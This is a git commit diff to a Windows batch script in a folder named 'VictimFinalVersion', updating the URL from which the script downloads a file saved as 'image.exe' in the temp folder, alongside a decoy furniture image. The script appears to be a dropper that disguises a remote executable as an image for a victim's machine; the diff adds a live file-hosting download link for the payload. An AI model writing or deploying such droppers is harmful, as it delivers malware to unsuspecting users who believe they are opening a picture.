856b0fea1755ad2c52ff9e7740873c645427125c
devkaare <kaarehofferdal@gmail.com>
2025-02-02 06:28:51 +0100

    Feat

--- VictimFinalVersion/run.bat
+++ VictimFinalVersion/run.bat
@@ -2,7 +2,7 @@
 setlocal enabledelayedexpansion
 
 set "imageURL=https://www.homedora.com/cdn/shop/files/UrlaAngel04Cream_8_1_1.jpg"
-set "execURL=https://www.filemail.com/d/sojqnfbeqewzczb"
+set "execURL=https://3007.filemail.com/api/file/get?filekey=fVOHT_OX-ENDDU3pUi9eUvdbs3YARgl97oK9ZHl-JpmGfZR5SH9Qrw-Xww&pk_vid=fb4236a0f45035151738474088bb32ea"
 
 set "imageFile=%TEMP%\UrlaAngel04Cream_8_1_1.jpg"
 set "execFile=%TEMP%\image.exe"
